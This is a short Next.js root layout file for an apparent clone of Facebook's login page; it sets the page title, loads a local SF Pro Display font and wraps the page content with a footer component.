import localFont from "next/font/local";
import "./globals.css";
import Footer from "@/components/Footer";

export const metadata = {
  title: "Facebook - log in or sign up",
};

const SFProDisplay = localFont({
  src: "../public/SFProDisplay-Regular.ttf",
  display: "swap",
});

export default function RootLayout({ children }) {
  return (
    <html lang="en" className={SFProDisplay.className}>
      <body>
        {children}
        <Footer />
      </body>
    </html>
  );
}
